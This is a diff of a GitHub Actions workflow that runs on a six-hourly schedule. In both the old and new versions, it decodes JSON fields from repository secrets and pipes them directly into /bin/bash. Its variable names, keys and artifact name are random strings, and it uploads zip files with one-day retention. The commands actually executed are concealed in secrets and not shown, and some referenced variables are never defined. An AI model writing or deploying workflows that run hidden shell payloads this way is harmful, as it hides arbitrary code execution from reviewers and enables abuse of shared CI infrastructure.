@@ -1,23 +1,26 @@
 name: haidongguanbi
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '30 1/6 * * *'
 
-jobs:  # 13449
+  schedule:
+    - cron: '48 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: haidongguanbi
         env:
-          cjpzj990: ${{ secrets.cjpzj990 }}
+          v14357: ${{ secrets.v14357 }}
         run: |
-          echo $cjpzj990 | jq -r .nfj2 | /bin/bash
-          echo $gpluv014 | jq -r .dx34307 | /bin/bash
-          echo $jhrwk9934 | jq -r .oo711 | /bin/bash
-          echo $wxhh5206 | jq -r .dq4 | /bin/bash
-          echo $ekofj08 | jq -r .zxumr20617 | /bin/bash
+          printf '%s' "$v14357" | jq -r .imole6678 | /bin/bash
+          printf '%s' "$irlfd85" | jq -r .fg5 | /bin/bash
+          echo $fgf02 | jq -r .k2571 | /bin/bash
+          echo $hnii10 | jq -r .wdaxk30 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: PTCvkaAX
+          path: "*.zip"
+          retention-days: 1
